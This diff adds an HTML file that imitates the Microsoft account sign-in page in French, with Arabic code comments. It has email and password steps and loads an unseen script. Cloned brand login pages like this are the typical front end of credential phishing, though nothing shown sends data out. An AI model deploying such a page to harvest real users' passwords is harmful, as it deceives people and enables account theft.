@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à votre compte Microsoft</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="container">
+        <!-- صندوق تسجيل الدخول الرئيسي -->
+        <div class="login-box">
+            
+            <!-- الهيدر المشترك للوغو وزر العودة -->
+            
+                <button type="button" id="btn-back" class="btn-back hidden" aria-label="Retour">
+                    <svg viewBox="0 0 24 24" width="24" height="24">
+                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" fill="#1b1b1b"/>
+                    </svg>
+                </button>
+                <div class="logo">
+                    <div class="ms-logo">
+                        <span class="red"></span><span class="green"></span>
+                        <span class="blue"></span><span class="yellow"></span>
+                    </div>
+                    <span class="brand-name">Microsoft</span>
+                </div>
+            </div>
+
+            <!-- معلومات الحساب تظهر فقط في مرحلة كلمة السر -->
+            <div id="user-display" class="user-display hidden">
+                <span id="display-email">username@email.com</span>
+            </div>
+
+            <!-- المرحلة الأولى: إدخال البريد الإلكتروني -->
+            <div id="step-email" class="step-content active">
+                <h2>Se connecter</h2>
+                <form id="form-email">
+                    <div class="input-group">
+                        <input type="text" id="username" placeholder="E-mail, téléphone ou identifiant Skype" required autocomplete="username">
+                    </div>
+                    <p class="text-link">Vous n'avez pas encore de compte ? <a href="#">Créez-en un !</a></p>
+                    <p class="text-link"><a href="#">Votre compte n'est pas accessible ?</a></p>
+                    <div class="button-group">
+                        <button type="submit" class="btn-primary">Suivant</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- المرحلة الثانية: إدخال كلمة السر -->
+            <div id="step-password" class="step-content hidden">
+                <h2>Entrer le mot de passe</h2>
+                <form id="form-password">
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder="Mot de passe" required autocomplete="current-password">
+                    </div>
+                    <p class="text-link"><a href="#">Mot de passe oublié ?</a></p>
+                    <p class="text-link"><a href="#">Se connecter d'une autre manière</a></p>
+                    <div class="button-group">
+                        <button type="submit" class="btn-primary">Se connecter</button>
+                    </div>
+                </form>
+            </div>
+
+        </div>
+
+        <!-- خيارات تسجيل الدخول الإضافية -->
+        <div id="options-container" class="options-box">
+            <button class="btn-options">
+                <svg class="key-icon" viewBox="0 0 24 24" width="20" height="20">
+                    <path d="M7 18a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm0-6a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm11.6-4.6a1 1 0 0 0-1.4 0l-7.5 7.5a6 6 0 1 0 2.8 2.8l1.4-1.4h1.7v1.7a1 1 0 0 0 1 1h1.7v1.7a1 1 0 0 0 1 1h2.2a1 1 0 0 0 1-1v-2.2a1 1 0 0 0-.3-.7l-4.1-4.1v-1.7h1.7a1 1 0 0 0 1-1v-1.7h1.7a1 1 0 0 0 .7-.3l.7-.7a1 1 0 0 0 0-1.4z" fill="#555"/>
+                </svg>
+                <span>Options de connexion</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- تذييل الصفحة -->
+    <footer>
+        <a href="#">Conditions d'utilisation</a>
+        <a href="#">Confidentialité et cookies</a>
+        <a href="#">Accessibilité : partiellement conforme</a>
+        <a href="#">...</a>
+    </footer>
+
+    <!-- ربط كود الجافا سكريبت -->
+    <script src="script.js"></script>
+</body>
+</html>
